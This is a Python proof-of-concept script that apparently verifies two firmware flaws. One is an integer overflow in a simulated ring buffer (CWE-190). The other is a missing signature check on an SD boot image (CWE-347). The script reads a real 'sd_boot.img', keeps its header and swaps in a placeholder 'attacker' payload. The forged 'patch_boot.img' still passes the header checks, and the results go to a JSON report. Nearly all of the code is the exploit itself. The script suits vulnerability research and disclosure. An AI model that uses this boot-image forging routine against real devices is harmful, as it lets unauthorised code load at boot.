import os
import sys
import json
import struct
import hashlib

RING_CAP = 0x400
MASK32 = 0xFFFFFFFF


class RingBuffer:
    def __init__(self):
        self.count = 0
        self.wptr = 0
        self.rptr = 0
        self.buf = bytearray(RING_CAP)

    def write(self, data):
        for b in data:
            self.buf[self.wptr] = b
            self.wptr = (self.wptr + 1) % RING_CAP
        self.count = (self.count + len(data)) & MASK32

    def read(self, length):
        if length == 0:
            return b""
        n = length if length < self.count else self.count
        out = bytearray()
        for _ in range(n):
            out.append(self.buf[self.rptr])
            self.rptr = (self.rptr + 1) % RING_CAP
        self.count = (self.count - n) & MASK32
        return bytes(out)


def run_vuln01():
    a = b"A" * 0x200
    b = b"B" * 0x200
    rb = RingBuffer()
    rb.write(a)
    rb.write(b)
    s1 = rb.read(0x400)
    baseline_ok = s1 == (a + b)

    rb2 = RingBuffer()
    rb2.write(a)
    rb2.write(b)
    c = b"C" * 0x400
    rb2.write(c)
    pre = rb2.count
    amplified = rb2.read(pre)
    amp_ok = (
        pre > RING_CAP
        and amplified[:RING_CAP] == c
        and amplified[RING_CAP:] == c[: len(amplified) - RING_CAP]
    )

    rb3 = RingBuffer()
    big = b"X" * 0x1000
    rb3.write(big)
    pre3 = rb3.count
    out3 = rb3.read(pre3)
    wrapped = big[-RING_CAP:]
    expected = (wrapped * ((0x1000 // RING_CAP) + 1))[:0x1000]
    amp_big_ok = out3 == expected

    return {
        "vuln": "VULN-01",
        "cwe": "CWE-190",
        "component": "ring_buffer",
        "function": "sub_00001248",
        "offset": "0x0000126e",
        "baseline_io_ok": baseline_ok,
        "count_overflow_value": hex(pre),
        "count_overflow_detected": pre > RING_CAP,
        "data_amplification_ok": amp_ok,
        "oversized_write_replay_ok": amp_big_ok,
        "vulnerable": baseline_ok and pre > RING_CAP and amp_ok and amp_big_ok,
    }


def parse_header(blob):
    if len(blob) < 8:
        return None
    t, s, r1, r2 = struct.unpack_from("<HHHH", blob, 0)
    return {"type": t, "size": s, "field4": r1, "field6": r2}


def is_mode0(h):
    return (
        3 <= h["type"] <= 7
        and 0x05DD <= h["size"] <= 0x176F
        and h["field4"] == 0
        and h["field6"] == 0
    )


def is_mode1(h):
    return (
        3 <= h["type"] <= 7
        and 0x0001 <= h["size"] <= 0x01F3
        and 3 <= h["field4"] <= 8
        and 0x12D <= h["field6"] <= 0x289F
    )


def default_mode0():
    hdr = struct.pack("<HHHH", 4, 0x1000, 0, 0)
    pl = b"LEGIT_PAYLOAD_" * 16
    return hdr + struct.pack("<I", len(pl)) + pl


def inspect_file(path):
    if not os.path.exists(path):
        return None
    with open(path, "rb") as f:
        blob = f.read()
    head = blob[:16]
    return {
        "path": path,
        "size": len(blob),
        "head_hex": head.hex(),
        "head_ascii": "".join(
            chr(c) if 0x20 <= c < 0x7F else "." for c in head
        ),
        "matches_mode0": is_mode0(parse_header(blob) or {"type": 0, "size": 0, "field4": 1, "field6": 1}),
        "matches_mode1": is_mode1(parse_header(blob) or {"type": 0, "size": 0, "field4": 0, "field6": 0}),
        "header_fields": parse_header(blob),
    }


def build_bypass(legit_blob, source, patch_path):
    h = parse_header(legit_blob)
    if h is None:
        return None
    if is_mode0(h):
        mode = 0
    elif is_mode1(h):
        mode = 1
    else:
        return None

    attacker = (b"\xde\xad\xbe\xef" * 128)[:512]

    if mode == 0:
        patch = legit_blob[:8] + struct.pack("<I", len(attacker)) + attacker
    else:
        patch = legit_blob[:8] + attacker

    with open(patch_path, "wb") as f:
        f.write(patch)
    with open(patch_path, "rb") as f:
        patch_blob = f.read()

    ph = parse_header(patch_blob)
    pass0 = is_mode0(ph)
    pass1 = is_mode1(ph)
    identical = patch_blob[:8] == legit_blob[:8]
    bypass = identical and ((mode == 0 and pass0) or (mode == 1 and pass1))

    if mode == 0:
        create_values = {
            "mode": 0,
            "offset_0_u16_type": ph["type"],
            "offset_2_u16_size": ph["size"],
            "offset_4_u16_reserved1": 0,
            "offset_6_u16_reserved2": 0,
            "header_hex": patch_blob[:8].hex(),
        }
    else:
        create_values = {
            "mode": 1,
            "offset_0_u16_type": ph["type"],
            "offset_2_u16_size": ph["size"],
            "offset_4_u16_field4": ph["field4"],
            "offset_6_u16_field6": ph["field6"],
            "header_hex": patch_blob[:8].hex(),
        }

    return {
        "source": source,
        "legit_header_hex": legit_blob[:8].hex(),
        "legit_header_fields": h,
        "detected_mode": mode,
        "patch_header_hex": patch_blob[:8].hex(),
        "patch_header_fields": ph,
        "header_identical": identical,
        "patch_passes_mode0": pass0,
        "patch_passes_mode1": pass1,
        "patch_payload_len": len(attacker),
        "patch_payload_sha256": hashlib.sha256(attacker).hexdigest(),
        "create_values": create_values,
        "bypass_achieved": bypass,
    }


def run_vuln02(legit_path, patch_path):
    real_info = inspect_file(legit_path)
    real_proof = None

    if real_info is not None:
        with open(legit_path, "rb") as f:
            real_blob = f.read()
        real_proof = build_bypass(real_blob, "sd_boot.img", patch_path)

    if real_proof is not None and real_proof["bypass_achieved"]:
        proof = real_proof
        fallback_used = False
    else:
        synthetic = default_mode0()
        proof = build_bypass(synthetic, "synthetic_mode0", patch_path)
        fallback_used = True

    result = {
        "vuln": "VULN-02",
        "cwe": "CWE-347",
        "component": "sd_boot_header",
        "function": "sub_000166d4",
        "offset": "0x000016d4",
        "provided_file_analysis": real_info,
        "fallback_used": fallback_used,
    }
    result.update(proof)
    result["vulnerable"] = proof["bypass_achieved"]
    return result


def main():
    r1 = run_vuln01()
    r2 = run_vuln02("sd_boot.img", "patch_boot.img")
    report = {
        "vuln01": r1,
        "vuln02": r2,
        "all_pass": bool(r1.get("vulnerable") and r2.get("vulnerable")),
    }
    with open("poc_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(json.dumps(report, ensure_ascii=False, indent=2))
    sys.exit(0 if report["all_pass"] else 1)


if __name__ == "__main__":
    main()
